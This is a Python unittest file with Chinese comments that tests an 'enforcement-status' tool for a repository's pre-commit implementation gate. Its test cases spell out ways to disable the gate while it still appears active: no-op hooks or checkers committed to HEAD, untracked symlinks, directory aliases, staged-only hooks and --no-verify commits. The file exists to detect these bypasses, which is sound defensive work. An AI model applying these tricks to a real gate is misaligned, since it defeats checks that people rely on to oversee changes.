            reprobe=self._status(r,'--probe')
            self.assertNotEqual(reprobe.returncode,0,'空轉 hook 的行為驗證必須失敗\n'+reprobe.stdout+reprobe.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_receipt_invalidated_when_gate_implementation_changes(self):
        """P1-2 延伸：hook 沒變、但 check-implementation-gate.py 被改成空轉，receipt 必須失效。"""
        td,r=self._hook_repo('#!/bin/sh\nbash .githooks/pre-commit || exit 1\n')
        try:
            ok=self._status(r,'--probe')
            self.assertEqual(ok.returncode,0,ok.stdout+ok.stderr)
            gate=r/'workflow/bin/check-implementation-gate.py'
            gate.write_text('#!/usr/bin/env python3\nimport sys\nsys.exit(0)\n',encoding='utf-8')
            bad=self._status(r)
            self.assertNotEqual(bad.returncode,0,'gate 實作被掏空後 receipt 必須失效\n'+bad.stdout+bad.stderr)
            self.assertIn('gate_impl_sha256',bad.stdout)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_pass_evidence_requires_matching_policy(self):
        """P1-4：PASS 分支必須核對 Verification policy 與 Checks selected。"""
        import importlib.util, sys
        td=Path(tempfile.mkdtemp(prefix='rc5r2-ev-')); r=td/'repo'; r.mkdir()
        try:
            for rel in OWNED:
                src=SRC/rel
                if not src.exists(): continue
                dst=r/rel
                if src.is_dir():
                    shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc'))
                else:
                    dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
            sys.path.insert(0,str(r/'workflow/bin'))
            spec=importlib.util.spec_from_file_location('wt_p14',r/'workflow/bin/workflow_transition.py')
            m=importlib.util.module_from_spec(spec); sys.modules['wt_p14']=m; spec.loader.exec_module(m)
            ev=r/'ev.md'
            # 這一組測的是**語意**分支。evidence 現在還要自證來歷，所以每份手工樣本
            # 都補上合法的 digest —— 否則測試會退化成「缺欄位被拒」，
            # 完全測不到 policy 與 Checks selected 的核對。
            dg=stamp_approved_profile(r)
            def check(text):
                text=text.replace('Core evidence schema: 2\n',
                                  f'Core evidence schema: 2\nApproved profile digest: {dg}\n',1)
                ev.write_text(text,encoding='utf-8'); return m.core_evidence_status(ev)

            ok,why=check('# x\nCore evidence schema: 2\nVerification policy: made-up\n'
                         'Checks executed: 1\nExit code: 0\nOutcome: PASS\nOverall exit code: 0\n')
            self.assertFalse(ok,'不存在的 policy 不得產生 PASS'); self.assertIn('只有 auto/custom',why)

            ok,why=check('# x\nCore evidence schema: 2\nVerification policy: not-applicable\n'
                         'Checks executed: 1\nExit code: 0\nOutcome: PASS\nOverall exit code: 0\n')
            self.assertFalse(ok,'not-applicable 不得產生 PASS')

            ok,why=check('# x\nCore evidence schema: 2\nVerification policy: auto\n'
                         'Checks selected: 3\nChecks executed: 1\nExit code: 0\nOutcome: PASS\nOverall exit code: 0\n')
            self.assertFalse(ok,'selected 與 executed 不符時應拒絕'); self.assertIn('不符',why)

            ok,why=check('# x\nCore evidence schema: 2\nVerification policy: auto\n'
                         'Checks selected: 1\nChecks executed: 1\nExit code: 0\nOutcome: PASS\nOverall exit code: 0\n')
            self.assertTrue(ok,f'自洽的 PASS 應被接受：{why}')
        finally:
            sys.path.remove(str(r/'workflow/bin'))
            for k in ('wt_p14','workflow_state'): sys.modules.pop(k,None)
            shutil.rmtree(td,ignore_errors=True)



class RC5Round4Tests(unittest.TestCase):
    """Codex 第四輪發現：symlink 繞過 tracked 檢查，以及缺少的 regression。"""

    def _repo(self):
        td=Path(tempfile.mkdtemp(prefix='rc5r4-')); r=td/'repo'; r.mkdir()
        (r/'src').mkdir(); (r/'src/a.py').write_text('x = 1\n')
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
        for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],
                  ['git','config','user.name','A'],['git','add','-A'],['git','commit','-m','base']):
            subprocess.run(c,cwd=r,check=True,capture_output=True)
        return td,r

    def _status(self,r,*extra):
        return subprocess.run(['python3','workflow/bin/workflow_transition.py','enforcement-status',*extra],
                              cwd=r,capture_output=True,text=True)

    def test_untracked_symlink_managed_hook_is_not_active(self):
        """未追蹤的 symlink 指向已追蹤的合法 hook —— fresh clone 不會有它，不得判為 active。"""
        td,r=self._repo()
        try:
            subprocess.run(['git','config','core.hooksPath','.githooks'],cwd=r,check=True)
            ok=self._status(r,'--probe')
            self.assertEqual(ok.returncode,0,'前置條件：實體檔案應能通過\n'+ok.stdout+ok.stderr)

            real=r/'.githooks/real-hook'
            real.write_text((r/'.githooks/pre-commit').read_text(encoding='utf-8'),encoding='utf-8')
            real.chmod(0o755)
            subprocess.run(['git','add','.githooks/real-hook'],cwd=r,check=True)
            subprocess.run(['git','commit','--no-verify','-m','add real hook'],cwd=r,check=True,capture_output=True)
            subprocess.run(['git','rm','--cached','-q','.githooks/pre-commit'],cwd=r,check=True,capture_output=True)
            subprocess.run(['git','commit','--no-verify','-m','untrack pre-commit'],cwd=r,check=True,capture_output=True)
            hook=r/'.githooks/pre-commit'; hook.unlink(); hook.symlink_to('real-hook')

            x=self._status(r)
            self.assertNotEqual(x.returncode,0,'未追蹤的 symlink 不得判為 active\n'+x.stdout+x.stderr)
            # 必須鎖 Reason 行：`Effective pre-commit is a symlink to:` 那行由 info['symlink']
            # 獨立印出，拿掉理由特化後仍會出現，斷言整份 stdout 含 'symlink' 抓不到迴歸。
            reason=[l for l in x.stdout.splitlines() if l.startswith('Reason:')]
            self.assertTrue(reason and 'symlink' in reason[0],
                            f'理由必須直接說明是 symlink，實際：{reason}')
            # 顯示的有效路徑必須是 symlink 本身，不是解析後的目標 ——
            # 否則輸出會與下一行「這是 symlink」的理由自相矛盾。
            self.assertIn('Effective pre-commit: .githooks/pre-commit',x.stdout,
                          '有效路徑不得顯示成 resolve() 後的目標檔\n'+x.stdout)
            self.assertNotIn('Effective pre-commit: .githooks/real-hook',x.stdout)
            pr=self._status(r,'--probe')
            self.assertNotEqual(pr.returncode,0,'即使 probe 能通過，symlink 仍不得 active\n'+pr.stdout+pr.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_bootstrap_managed_install_reaches_active_managed(self):
        """greenfield 安裝後應自動完成行為驗證並達到 ACTIVE_MANAGED。"""
        td=Path(tempfile.mkdtemp(prefix='rc5r4-boot-')); r=td/'repo'; r.mkdir()
        try:
            for rel in OWNED:
                src=SRC/rel
                if not src.exists(): continue
                dst=r/rel
                if src.is_dir():
                    shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc'))
                else:
                    dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
            subprocess.run(['git','init','-b','main'],cwd=r,check=True,capture_output=True)
            subprocess.run(['git','config','user.email','a@example.invalid'],cwd=r,check=True)
            subprocess.run(['git','config','user.name','A'],cwd=r,check=True)
            b=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,capture_output=True,text=True)
            self.assertEqual(b.returncode,0,b.stdout+b.stderr)
            self.assertIn('行為驗證通過',b.stdout+b.stderr)
            s=self._status(r)
            self.assertEqual(s.returncode,0,s.stdout+s.stderr)
            self.assertIn('ACTIVE_MANAGED',s.stdout)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_setup_cfg_sections_are_detected(self):
        """setup.cfg 的 [tool:pytest] / [mypy] / [ruff] 都必須被辨識為已配置。"""
        import importlib.util, sys
        td,r=self._repo()
        try:
            sys.path.insert(0,str(r/'workflow/bin'))
            spec=importlib.util.spec_from_file_location('ws_cfg',r/'workflow/bin/workflow_state.py')
            ws=importlib.util.module_from_spec(spec); sys.modules['ws_cfg']=ws; spec.loader.exec_module(ws)
            probe=Path(tempfile.mkdtemp())
            (probe/'setup.cfg').write_text('[tool:pytest]\ntestpaths = tests\n\n[mypy]\nstrict = True\n',encoding='utf-8')
            self.assertTrue(ws._python_tool_configured(probe,'pytest'),'[tool:pytest] 必須被辨識')
            self.assertTrue(ws._python_tool_configured(probe,'mypy'),'[mypy] 必須被辨識')
            self.assertFalse(ws._python_tool_configured(probe,'ruff'),'沒有 [ruff] 時不得誤判')
            plan=ws.plan_checks(probe,'full')
            self.assertTrue(any(c['name']=='pytest' for c in plan),'只有 setup.cfg 的專案也必須進入 Python 偵測')
            shutil.rmtree(probe,ignore_errors=True)
        finally:
            sys.path.remove(str(r/'workflow/bin'))
            for k in ('ws_cfg','workflow_state'): sys.modules.pop(k,None)
            shutil.rmtree(td,ignore_errors=True)

class RC5Round5AliasTests(unittest.TestCase):
    """第五輪：同一個 managed hook 目錄的別名不得繞過 fresh-clone 不變式。

    共同威脅模型：本機 enforcement-status 顯示 ACTIVE，但 fresh clone 之後 gate 根本不存在。
    """

    def _repo(self):
        td=Path(tempfile.mkdtemp(prefix='rc5r5-')); r=td/'repo'; r.mkdir()
        (r/'src').mkdir(); (r/'src/a.py').write_text('x = 1\n')
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
        for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],
                  ['git','config','user.name','A'],['git','add','-A'],['git','commit','-m','base']):
            subprocess.run(c,cwd=r,check=True,capture_output=True)
        return td,r

    def _status(self,r,*extra):
        return subprocess.run(['python3','workflow/bin/workflow_transition.py','enforcement-status',*extra],
                              cwd=r,capture_output=True,text=True)

    def _untrack_and_symlink(self,r):
        """把 .githooks/pre-commit 換成未追蹤的 symlink，指向已追蹤的真 hook。"""
        real=r/'.githooks/real-hook'
        real.write_text((r/'.githooks/pre-commit').read_text(encoding='utf-8'),encoding='utf-8')
        real.chmod(0o755)
        subprocess.run(['git','add','.githooks/real-hook'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','commit','--no-verify','-m','add real hook'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','rm','--cached','-q','.githooks/pre-commit'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','commit','--no-verify','-m','untrack'],cwd=r,check=True,capture_output=True)
        h=r/'.githooks/pre-commit'; h.unlink(); h.symlink_to('real-hook')

    def _assert_not_active(self,r,why):
        s=self._status(r)
        self.assertNotEqual(s.returncode,0,f'{why}：不得判為 active\n'+s.stdout+s.stderr)
        self.assertIn('INACTIVE',s.stdout,f'{why}：應為 INACTIVE\n'+s.stdout)
        pr=self._status(r,'--probe')
        self.assertNotEqual(pr.returncode,0,f'{why}：即使 probe 通過也不得 active\n'+pr.stdout+pr.stderr)

    def _assert_fresh_clone_is_inactive(self,td,r):
        """對照組：證明這確實是「本機 active / clone 不 active」而不是別的問題。"""
        c=td/'clone'
        subprocess.run(['git','clone','-q',str(r),str(c)],check=True,capture_output=True)
        subprocess.run(['git','config','core.hooksPath','.githooks'],cwd=c,check=True,capture_output=True)
        s=self._status(c)
        self.assertNotEqual(s.returncode,0,'fresh clone 本來就不 active —— 這正是繞過的證據\n'+s.stdout)

    def test_case_insensitive_dir_alias_does_not_bypass(self):
        """.GITHOOKS 與 .githooks 在 APFS 上是同一個目錄，不得因字串不等而落到 chained 分支。"""
        td,r=self._repo()
        try:
            if not (r/'.GITHOOKS').is_dir():
                self.skipTest('此檔案系統區分大小寫，別名情境不適用')
            subprocess.run(['git','config','core.hooksPath','.GITHOOKS'],cwd=r,check=True)
            self._untrack_and_symlink(r)
            self._assert_not_active(r,'大小寫別名 .GITHOOKS')
            self._assert_fresh_clone_is_inactive(td,r)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_absolute_ancestor_symlink_alias_does_not_bypass(self):
        """core.hooksPath 經由指向同一 repository 的絕對 ancestor symlink 抵達 .githooks。"""
        td,r=self._repo()
        try:
            alias=td/'alias'; alias.symlink_to(r)
            subprocess.run(['git','config','core.hooksPath',str(alias/'.githooks')],cwd=r,check=True)
            self._untrack_and_symlink(r)
            self._assert_not_active(r,'絕對 ancestor symlink 別名')
            self._assert_fresh_clone_is_inactive(td,r)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_ancestor_alias_with_untracked_plain_file_does_not_bypass(self):
        """同一別名、但 hook 是未追蹤的普通檔案（非 symlink）—— 仍然 clone 不到。"""
        td,r=self._repo()
        try:
            alias=td/'alias'; alias.symlink_to(r)
            subprocess.run(['git','config','core.hooksPath',str(alias/'.githooks')],cwd=r,check=True)
            subprocess.run(['git','rm','--cached','-q','.githooks/pre-commit'],cwd=r,check=True,capture_output=True)
            subprocess.run(['git','commit','--no-verify','-m','untrack'],cwd=r,check=True,capture_output=True)
            s=self._status(r)
            self.assertNotEqual(s.returncode,0,'未追蹤的普通檔案 hook 不得判為 active\n'+s.stdout)
            self.assertIn('未被 Git 追蹤',s.stdout,s.stdout)
            pr=self._status(r,'--probe')
            self.assertNotEqual(pr.returncode,0,'即使 probe 通過也不得 active\n'+pr.stdout+pr.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_chained_hook_must_also_survive_a_fresh_clone(self):
        """chained 分支同型繞過：core.hooksPath=.myhooks，未追蹤的 .myhooks/pre-commit
        symlink 到已追蹤的 .githooks/pre-commit。probe 會通過，但 clone 之後不存在。

        Codex 第五輪只點名 managed 身分；這一條是同一個 bug class 在 chained 分支的變體。
        """
        td,r=self._repo()
        try:
            my=r/'.myhooks'; my.mkdir()
            (my/'pre-commit').symlink_to('../.githooks/pre-commit')
            subprocess.run(['git','config','core.hooksPath','.myhooks'],cwd=r,check=True)
            s=self._status(r)
            self.assertNotEqual(s.returncode,0,'未追蹤的 chained hook 不得判為 active\n'+s.stdout)
            self.assertIn('INACTIVE',s.stdout,s.stdout)
            pr=self._status(r,'--probe')
            self.assertNotEqual(pr.returncode,0,'即使 probe 通過也不得 active\n'+pr.stdout+pr.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    # --- 以下三條刻意設計成「只有一層防禦適用」，用來隔離各層 -------------
    # 前面的別名測試斷言的是最終結果（INACTIVE），但各層防禦會互相遮蔽：
    # 單獨移除 samefile、通用 tracked 規則或 symlink 拒絕，結果仍是 INACTIVE，
    # 突變測試因此全綠。那等於這些修正沒有被任何測試鎖住。

    def test_legitimate_repo_via_dir_alias_is_still_ACTIVE_MANAGED(self):
        """隔離 samefile：完全合法的 managed 安裝，只是經由 .GITHOOKS 別名抵達。

        身分若退回字串相等，這個 repo 會被誤判成 chained，靜態找不到 bridge → UNKNOWN。
        用「正向」斷言隔離，因為負向情境會被其他層搶先擋下。
        """
        td,r=self._repo()
        try:
            if not (r/'.GITHOOKS').is_dir():
                self.skipTest('此檔案系統區分大小寫')
            subprocess.run(['git','config','core.hooksPath','.GITHOOKS'],cwd=r,check=True)
            pr=self._status(r,'--probe')
            self.assertEqual(pr.returncode,0,'合法安裝經由別名抵達仍應 active\n'+pr.stdout+pr.stderr)
            self.assertIn('ACTIVE_MANAGED',pr.stdout,
                          'managed 身分必須以實體目錄同一性判斷，不能用字串相等\n'+pr.stdout)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_untracked_plain_file_in_custom_hooks_dir_is_not_active(self):
        """隔離通用 tracked 規則：非 managed 目錄、普通檔案（非 symlink）、內含合法 bridge。

        symlink 拒絕與 managed tracked 檢查都不適用，只有「任何有效 hook 都必須 tracked」
        這一層擋得住。移除該層後 probe 會通過並回報 ACTIVE_CHAINED。
        """
        td,r=self._repo()
        try:
            my=r/'.myhooks'; my.mkdir()
            h=my/'pre-commit'
            h.write_text('#!/bin/sh\nbash .githooks/pre-commit || exit 1\n',encoding='utf-8')
            h.chmod(0o755)
            subprocess.run(['git','config','core.hooksPath','.myhooks'],cwd=r,check=True)
            self.assertFalse(h.is_symlink(),'前置條件：必須是普通檔案')
            self.assertEqual(subprocess.run(['git','ls-files','-s','.myhooks/pre-commit'],
                                            cwd=r,capture_output=True,text=True).stdout.strip(),'',
                             '前置條件：必須未被追蹤')
            s=self._status(r)
            self.assertNotEqual(s.returncode,0,'未追蹤的自訂 hook 不得 active\n'+s.stdout)
            self.assertIn('未被 Git 追蹤',s.stdout,s.stdout)
            pr=self._status(r,'--probe')
            self.assertNotEqual(pr.returncode,0,'即使 probe 通過也不得 active\n'+pr.stdout+pr.stderr)
            self.assertNotIn('ACTIVE_CHAINED',pr.stdout,pr.stdout)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_worktree_symlink_over_tracked_hook_is_not_active(self):
        """隔離 symlink 拒絕：index 裡是 100755 的真 hook，working tree 卻被換成 symlink。

        tracked 檢查看 index（通過）、mode 檢查看 index（通過），只有對最終元件做
        lstat 的 symlink 拒絕擋得住。實際被執行的是 symlink 指向的東西 ——
        本機 gate 已是空轉，狀態卻會顯示 active。
        """
        td,r=self._repo()
        try:
            subprocess.run(['git','config','core.hooksPath','.githooks'],cwd=r,check=True)
            noop=r/'.githooks/noop'; noop.write_text('#!/bin/sh\nexit 0\n',encoding='utf-8'); noop.chmod(0o755)
            h=r/'.githooks/pre-commit'; h.unlink(); h.symlink_to('noop')
            mode=subprocess.run(['git','ls-files','-s','.githooks/pre-commit'],
                                cwd=r,capture_output=True,text=True).stdout.split()[0]
            self.assertEqual(mode,'100755','前置條件：index 必須仍是 100755 的普通檔案')
            self.assertTrue(h.is_symlink(),'前置條件：working tree 必須是 symlink')
            s=self._status(r)
            self.assertNotEqual(s.returncode,0,'working tree 的 symlink 覆蓋不得 active\n'+s.stdout)
            reason=[l for l in s.stdout.splitlines() if l.startswith('Reason:')]
            self.assertTrue(reason and 'symlink' in reason[0],
                            f'理由必須直接說明是 symlink，實際：{reason}\n{s.stdout}')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_git_hooks_dir_is_not_repository_enforcement(self):
        """.git/hooks/pre-commit 永遠 clone 不到，不得算 Repository enforcement。"""
        td,r=self._repo()
        try:
            subprocess.run(['git','config','--unset','core.hooksPath'],cwd=r,capture_output=True)
            gh=r/'.git/hooks'; gh.mkdir(parents=True,exist_ok=True)
            shutil.copy2(r/'.githooks/pre-commit',gh/'pre-commit'); (gh/'pre-commit').chmod(0o755)
            s=self._status(r)
            self.assertNotEqual(s.returncode,0,'.git/hooks 不得判為 active\n'+s.stdout)
            self.assertIn('Git 目錄內',s.stdout,s.stdout)
            self.assertNotIn('git add .git/',s.stdout,'不得建議一個註定失敗的指令')
            self.assertIn('setup-git-hooks.sh',s.stdout,'應指向可行的修法')
        finally: shutil.rmtree(td,ignore_errors=True)


class RC5Round6HeadIdentityTests(unittest.TestCase):
    """第六輪：fresh clone 拿到的是 HEAD，不是 index，也不是 worktree。

    前一輪的不變式綁在 `git ls-files -s`（index）與 worktree 內容上，兩者都是本機狀態，
    對一個有 shell 的對手完全可控。共同威脅模型與前幾輪相同 —— 本機回報 ACTIVE，
    fresh clone 之後 gate 不存在或不生效 —— 但這次分歧點在 HEAD。

    每條測試各自隔離一層。斷言鎖在**具體理由**而不只是 INACTIVE：
    深度防禦會讓「最終結果」被其他層保住，只看結果的斷言證明不了任何一層還在。
    """

    NOOP_HOOK = '#!/usr/bin/env bash\nexit 0\n'

    def _repo(self):
        td=Path(tempfile.mkdtemp(prefix='rc5r6-')); r=td/'repo'; r.mkdir()
        (r/'src').mkdir(); (r/'src/a.py').write_text('x = 1\n')
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
        for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],
                  ['git','config','user.name','A'],['git','config','core.hooksPath','.githooks'],
                  ['git','add','-A'],['git','commit','-m','base']):
            subprocess.run(c,cwd=r,check=True,capture_output=True)
        return td,r

    def _git(self,r,*args):
        return subprocess.run(['git',*args],cwd=r,check=True,capture_output=True,text=True)

    def _status(self,r,*extra):
        return subprocess.run(['python3','workflow/bin/workflow_transition.py','enforcement-status',*extra],
                              cwd=r,capture_output=True,text=True)

    def _reason(self,out):
        for line in out.splitlines():
            if line.startswith('Reason: '): return line[len('Reason: '):]
        return ''

    def _assert_fresh_clone_agrees(self,td,r,hooks_dir='.githooks'):
        """對照組：證明這確實是「本機 active／clone 不 active」，而不是別的原因造成的失敗。"""
        c=td/('clone-'+hooks_dir.strip('.').replace('/','-'))
        subprocess.run(['git','clone','-q',str(r),str(c)],check=True,capture_output=True)
        subprocess.run(['git','config','core.hooksPath',hooks_dir],cwd=c,check=True,capture_output=True)
        s=self._status(c,'--probe')
        self.assertNotEqual(s.returncode,0,
                            'fresh clone 本來就不 active —— 這正是本機回報 active 屬於繞過的證據\n'+s.stdout+s.stderr)

    def test_staged_only_hook_is_not_active(self):
        """隔離「已 staged 但未 commit」：index 有、HEAD 沒有。

        `git ls-files -s` 把 staged addition 也算成 tracked，但 clone 只拿得到 HEAD。
        """
        td,r=self._repo()
        try:
            (r/'.myhooks').mkdir()
            h=r/'.myhooks/pre-commit'
            h.write_text('#!/usr/bin/env bash\nbash .githooks/pre-commit || exit 1\n')
            h.chmod(0o755)
            self._git(r,'config','core.hooksPath','.myhooks')
            self._git(r,'add','.myhooks/pre-commit')          # 只 stage，不 commit
            self.assertEqual(self._git(r,'ls-files','-s','--','.myhooks/pre-commit').stdout.split()[0],
                             '100755','前提：index 必須顯示 100755，否則測不到本層')
            s=self._status(r)
            self.assertIn('INACTIVE',s.stdout,s.stdout)
            self.assertIn('尚未 commit 進 HEAD',self._reason(s.stdout),
                          '理由必須指出「未進 HEAD」；只說「未被追蹤」是錯的，它確實在 index 裡\n'+s.stdout)
            self._assert_fresh_clone_agrees(td,r,'.myhooks')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_staged_removal_of_committed_hook_is_not_active(self):
        """隔離「index 已 staged 移除」：HEAD 還好，但下一個 commit 就沒有 gate 了。"""
        td,r=self._repo()
        try:
            self._git(r,'rm','--cached','-q','.githooks/pre-commit')   # 只 stage 移除，不 commit
            self.assertEqual(self._git(r,'ls-tree','HEAD','--','.githooks/pre-commit').stdout.split()[0],
                             '100755','前提：HEAD 必須仍是好的，否則測到的是別層')
            s=self._status(r)
            self.assertIn('INACTIVE',s.stdout,s.stdout)
            self.assertIn('staged 移除',self._reason(s.stdout),s.stdout)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_head_noop_hook_with_functional_worktree_hook_is_not_active(self):
        """隔離 HEAD 快照 probe：HEAD 存空轉 hook，worktree 是真的會拒絕的 hook。

        路徑、mode、tracked 全部合格，worktree probe 也會通過 —— 因為它跑的就是 worktree。
        沒有 symlink，所以 symlink 那層不適用；能擋下來的只有對 HEAD 實際執行一次。
        """
        td,r=self._repo()
        try:
            real=(r/'.githooks/pre-commit').read_text(encoding='utf-8')
            (r/'.githooks/pre-commit').write_text(self.NOOP_HOOK,encoding='utf-8')
            (r/'.githooks/pre-commit').chmod(0o755)
            self._git(r,'add','.githooks/pre-commit')
            self._git(r,'commit','-q','--no-verify','-m','noop hook')
            (r/'.githooks/pre-commit').write_text(real,encoding='utf-8')   # worktree 換回真 hook
            (r/'.githooks/pre-commit').chmod(0o755)
            self.assertFalse((r/'.githooks/pre-commit').is_symlink(),'前提：必須是普通檔案')
            self.assertEqual(self._git(r,'ls-tree','HEAD','--','.githooks/pre-commit').stdout.split()[0],
                             '100755','前提：HEAD mode 必須合格，否則測到的是 mode 那層')
            pr=self._status(r,'--probe')
            self.assertNotEqual(pr.returncode,0,'worktree probe 通過不代表 clone 之後有效\n'+pr.stdout+pr.stderr)
            self.assertIn('本機行為驗證通過',pr.stdout,'前提：worktree probe 必須先通過，否則測不到 HEAD 那層')
            self.assertIn('HEAD 快照',pr.stdout+pr.stderr,pr.stdout+pr.stderr)
            self._assert_fresh_clone_agrees(td,r)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_head_noop_gate_checker_is_not_active(self):
        """隔離 HEAD 快照 probe 的**依賴鏈**：hook 檔案完全沒動，被換掉的是它呼叫的 checker。

        這一條證明「比對 hook 檔案」不足夠。gate_impl_sha256 也擋不住 —— 它讀的是 worktree，
        而 worktree 的 checker 是真的。只有對 HEAD 實際跑一次才驗得到。
        """
        td,r=self._repo()
        try:
            gate=r/'workflow/bin/check-implementation-gate.py'
            real=gate.read_text(encoding='utf-8')
            gate.write_text('import sys\nsys.exit(0)\n',encoding='utf-8')
            self._git(r,'add','workflow/bin/check-implementation-gate.py')
            self._git(r,'commit','-q','--no-verify','-m','noop checker')
            gate.write_text(real,encoding='utf-8')                          # worktree 換回真 checker
            head_hook=self._git(r,'ls-tree','HEAD','--','.githooks/pre-commit').stdout.split()
            self.assertEqual(head_hook[0],'100755','前提：hook 本身在 HEAD 裡必須完好')
            self.assertEqual(head_hook[2],
                             subprocess.run(['git','hash-object','.githooks/pre-commit'],cwd=r,
                                            capture_output=True,text=True).stdout.strip(),
                             '前提：hook 的 HEAD 與 worktree 內容必須一致，否則測到的是上一條')
            pr=self._status(r,'--probe')
            self.assertNotEqual(pr.returncode,0,'HEAD 的 checker 是空轉，不得判為 active\n'+pr.stdout+pr.stderr)
            self.assertIn('本機行為驗證通過',pr.stdout,'前提：worktree probe 必須先通過')
            self.assertIn('HEAD 快照',pr.stdout+pr.stderr,pr.stdout+pr.stderr)
            self._assert_fresh_clone_agrees(td,r)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_non_bash_hook_can_reach_active_chained(self):
        """隔離 probe 的執行方式：hook 用 `#!/usr/bin/env python3`，必須能通過行為驗證。

        git 是直接 exec hook 檔案，shebang 說了算。probe 若寫成 `bash <hook>` 代跑，
        這個完全合法的 hook 會被當成 shell script 而假性失敗，得到錯誤的 INACTIVE ——
        同時也讓 mode 644 的 hook 通過 probe（bash 不在意 executable bit）。
        這條是正向斷言：負向情境會被結構檢查搶先擋下，隔離不了這一層。
        """
        td,r=self._repo()
        try:
            (r/'.myhooks').mkdir()
            h=r/'.myhooks/pre-commit'
            h.write_text('#!/usr/bin/env python3\n'
                         'import subprocess, sys\n'
                         "sys.exit(subprocess.call('bash .githooks/pre-commit', shell=True))\n")
            h.chmod(0o755)
            self._git(r,'config','core.hooksPath','.myhooks')
            self._git(r,'add','.myhooks/pre-commit')
            self._git(r,'commit','-q','--no-verify','-m','python bridge hook')
            self.assertEqual(self._git(r,'ls-tree','HEAD','--','.myhooks/pre-commit').stdout.split()[0],
                             '100755','前提：結構檢查必須全部通過，否則測不到 probe 這一層')
            pr=self._status(r,'--probe')
            self.assertEqual(pr.returncode,0,
                             'python shebang 的 hook 是合法的；probe 不得因為改用 bash 代跑而誤判\n'
                             +pr.stdout+pr.stderr)
            self.assertIn('ACTIVE_CHAINED',pr.stdout,pr.stdout)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_worktree_symlink_over_noop_head_hook_reports_symlink_reason(self):
        """鎖住 symlink 分支的**理由訊息**。

        情境：HEAD／index 是 mode 100755 的空轉 hook，worktree 換成指向真 gate 的 symlink。
        曾經把這一段判定為死碼並標註「不是安全邊界」，那是錯的 —— 當時的程式移除它就會得到
        ACTIVE_MANAGED。加入 HEAD 快照 probe 之後本情境有兩層擋，但**不對任何一層的可達性
        再作宣稱**：這裡鎖的是理由訊息，移除該分支時本條會變紅。
        """
        td,r=self._repo()
        try:
            real=r/'.githooks/real-gate'
            real.write_text((r/'.githooks/pre-commit').read_text(encoding='utf-8'),encoding='utf-8')
            real.chmod(0o755)
            (r/'.githooks/pre-commit').write_text(self.NOOP_HOOK,encoding='utf-8')
            (r/'.githooks/pre-commit').chmod(0o755)
            self._git(r,'add','-A')
            self._git(r,'commit','-q','--no-verify','-m','noop hook + real gate')
            h=r/'.githooks/pre-commit'; h.unlink(); h.symlink_to('real-gate')
            self.assertEqual(self._git(r,'ls-files','-s','--','.githooks/pre-commit').stdout.split()[0],
                             '100755','前提：index 必須是 100755，否則測到的是 mode 那層')
            s=self._status(r)
            self.assertIn('INACTIVE',s.stdout,s.stdout)
            self.assertIn('symlink',self._reason(s.stdout),
                          '理由必須指名 symlink —— 「Effective pre-commit is a symlink to:」那行是'
                          '獨立印出的，斷言整段 stdout 抓不到本分支的迴歸\n'+s.stdout)
            self._assert_fresh_clone_agrees(td,r)
        finally: shutil.rmtree(td,ignore_errors=True)


class RC5Round7SnapshotFidelityTests(unittest.TestCase):
    """第七輪：HEAD 快照必須與**非遞迴 fresh clone** 等價，chained receipt 必須涵蓋整條依賴鏈。

    上一輪的快照是「在來源 repo 跑 checkout-index，再 init/add/commit」。那個做法會
    採用來源 .git/config 的 checkout 轉換（不會被 clone 帶走），而且會靜默丟掉 gitlink。
    三種可實際重現的繞過都是「快照通過、fresh clone 失敗」。
    """

    NOOP = '#!/usr/bin/env bash\nexit 0\n'

    def _repo(self):
        td=Path(tempfile.mkdtemp(prefix='rc5r7-')); r=td/'repo'; r.mkdir()
        (r/'src').mkdir(); (r/'src/a.py').write_text('x = 1\n')
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
